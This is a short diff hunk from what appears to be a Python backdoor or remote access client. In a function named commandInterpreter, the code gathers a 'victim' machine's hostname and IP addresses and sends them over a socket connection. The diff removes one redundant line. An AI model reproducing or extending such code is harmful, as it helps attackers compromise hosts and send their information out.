@@ -72,7 +72,6 @@ def commandInterpreter():
                 victim_info +=  'hostname : ' + socket.gethostname() + '\n'
                 victim_info += 'local ip : ' + cnx.getsockname()[0] + '\n'
                 victim_info += 'public ip : ' + socket.gethostbyname(socket.gethostname()) + '\n'
-                victim_info += 'ip : ' + socket.gethostbyname(socket.gethostname()) + '\n'
 
                 cnx.sendall(victim_info.encode())
                 print('victim info sent')
